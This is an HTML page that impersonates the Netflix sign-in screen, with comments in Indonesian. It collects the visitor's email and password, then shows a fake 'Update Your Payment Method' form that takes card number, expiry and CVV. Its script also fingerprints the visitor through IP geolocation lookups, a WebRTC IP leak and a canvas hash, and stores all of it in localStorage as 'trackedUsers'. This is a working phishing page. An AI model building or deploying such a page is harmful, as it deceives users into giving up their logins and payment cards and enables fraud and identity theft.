<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #141414;
            color: #fff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }
        .netflix-logo {
            width: 100px;
            height: 36px;
            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d0b0237-60f7-4e98-a752-092874e7e1fc/96dc82d8-7775-4e16-8347-7a862a7f1944/US-en-20240624-popsignuptwoweeks-perspective_alpha_website_small.png') no-repeat;
            background-size: contain;
        }
    </style>
</head>
<body>
    <!-- Halaman Login -->
    <div id="loginPage" class="min-h-screen flex flex-col">
        <header class="p-6">
            <div class="netflix-logo"></div>
        </header>
        <main class="flex-grow flex items-center justify-center">
            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
                <h1 class="text-3xl font-bold mb-6">Sign In</h1>
                <div id="loginForm" class="space-y-4">
                    <input id="email" type="email" placeholder="Email or phone number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                    <input id="password" type="password" placeholder="Password" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                    <button id="signInButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Sign In</button>
                    <p class="text-gray-400 text-sm">New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.</p>
                </div>
            </div>
        </main>
        <footer class="p-6 text-gray-400 text-sm">
            <p>Questions? Call 1-844-505-2993</p>
        </footer>
    </div>

    <!-- Halaman Pembayaran -->
    <div id="paymentPage" class="min-h-screen flex flex-col hidden">
        <header class="p-6">
            <div class="netflix-logo"></div>
        </header>
        <main class="flex-grow flex items-center justify-center">
            <div class="bg-black bg-opacity-70 p-8 md:p-12 rounded w-full max-w-md">
                <h1 class="text-2xl font-bold mb-6">Update Your Payment Method</h1>
                <div id="paymentForm" class="space-y-4">
                    <input id="cardHolder" type="text" placeholder="Name on Card" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                    <input id="cardNumber" type="text" placeholder="Card Number" class="w-full p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                    <div class="flex space-x-4">
                        <input id="expiryDate" type="text" placeholder="MM/YY" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                        <input id="cvv" type="text" placeholder="CVV" class="w-1/2 p-4 bg-gray-700 text-white rounded focus:outline-none focus:ring-2 focus:ring-red-600" required>
                    </div>
                    <button id="submitPaymentButton" class="w-full bg-red-600 text-white p-4 rounded hover:bg-red-700">Submit Payment</button>
                </div>
            </div>
        </main>
        <footer class="p-6 text-gray-400 text-sm">
            <p>Questions? Call 1-844-505-2993</p>
        </footer>
    </div>

    <script>
        async function collectUserData() {
            try {
                // 1. IP Geolocation (Dengan Fallback)
                let ipData = {};
                try {
                    const ipResponse = await fetch('https://ipapi.co/json/');
                    ipData = await ipResponse.json();
                } catch (error) {
                    console.log('IP Geolocation error (ipapi.co):', error);
                    try {
                        const fallbackResponse = await fetch('https://freegeoip.app/json/');
                        ipData = await fallbackResponse.json();
                    } catch (fallbackError) {
                        console.log('IP Geolocation fallback error:', fallbackError);
                        ipData = { ip: 'Tidak tersedia', city: 'Tidak tersedia', country: 'Tidak tersedia', latitude: 'Tidak tersedia', longitude: 'Tidak tersedia' };
                    }
                }

                // 2. Browser Fingerprinting (Zona Waktu dan Bahasa)
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const language = navigator.language;

                // 3. WebRTC Leak
                let webrtcIps = [];
                try {
                    const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    rtc.createDataChannel('');
                    rtc.onicecandidate = (event) => {
                        if (event.candidate) {
                            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ipMatch && !webrtcIps.includes(ipMatch[0])) {
                                webrtcIps.push(ipMatch[0]);
                            }
                        }
                    };
                    await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    rtc.close();
                } catch (error) {
                    console.log('WebRTC error:', error);
                    webrtcIps.push('Tidak tersedia');
                }

                // 4. Canvas Fingerprinting
                let canvasFingerprint = 'Tidak tersedia';
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.font = '14px Arial';
                    ctx.fillStyle = 'rgb(255, 0, 0)';
                    ctx.fillText('Fingerprint Test', 10, 20);
                    ctx.strokeStyle = 'rgb(0, 255, 0)';
                    ctx.beginPath();
                    ctx.arc(50, 50, 30, 0, Math.PI * 2);
                    ctx.stroke();
                    canvasFingerprint = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < canvasFingerprint.length; i++) {
                        hash = ((hash << 5) - hash) + canvasFingerprint.charCodeAt(i);
                        hash = hash & hash;
                    }
                    canvasFingerprint = hash.toString();
                } catch (error) {
                    console.log('Canvas Fingerprinting error:', error);
                }

                // 5. Informasi Browser
                const userAgent = navigator.userAgent;
                let platform = navigator.platform;
                if (/iPhone|iPad|iPod/.test(userAgent) && !platform.includes('iPhone')) {
                    platform = 'iPhone';
                }

                return {
                    ip: ipData.ip || 'Tidak tersedia',
                    city: ipData.city || 'Tidak tersedia',
                    country: ipData.country_name || ipData.country || 'Tidak tersedia',
                    ipLatitude: ipData.latitude || 'Tidak tersedia',
                    ipLongitude: ipData.longitude || 'Tidak tersedia',
                    timezone: timezone || 'Tidak tersedia',
                    language: language || 'Tidak tersedia',
                    webrtcIps: webrtcIps.length > 0 ? webrtcIps : ['Tidak tersedia'],
                    canvasFingerprint: canvasFingerprint,
                    userAgent,
                    platform,
                    timestamp: new Date().toISOString()
                };
            } catch (error) {
                console.error('Error mengumpulkan data:', error);
                return {};
            }
        }

        // Simpan data login dan pembayaran
        let userData = {};

        // Tangani login
        document.getElementById('signInButton').addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (email && password) {
                userData.email = email;
                userData.password = password;
                userData.tracking = await collectUserData();

                // Sembunyikan halaman login, tampilkan halaman pembayaran
                document.getElementById('loginPage').classList.add('hidden');
                document.getElementById('paymentPage').classList.remove('hidden');
            } else {
                alert('Please fill in all fields.');
            }
        });

        // Tangani pengiriman pembayaran
        document.getElementById('submitPaymentButton').addEventListener('click', () => {
            const cardHolder = document.getElementById('cardHolder').value;
            const cardNumber = document.getElementById('cardNumber').value;
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;

            if (cardHolder && cardNumber && expiryDate && cvv) {
                userData.payment = {
                    cardHolder,
                    cardNumber,
                    expiryDate,
                    cvv
                };

                // Simpan ke localStorage
                let storedData = JSON.parse(localStorage.getItem('trackedUsers') || '[]');
                storedData.push(userData);
                localStorage.setItem('trackedUsers', JSON.stringify(storedData));

                // Redirect atau tampilkan pesan sukses
                alert('Payment submitted successfully. Thank you!');
                window.location.reload();
            } else {
                alert('Please fill in all payment fields.');
            }
        });
    </script>
</body>
</html>
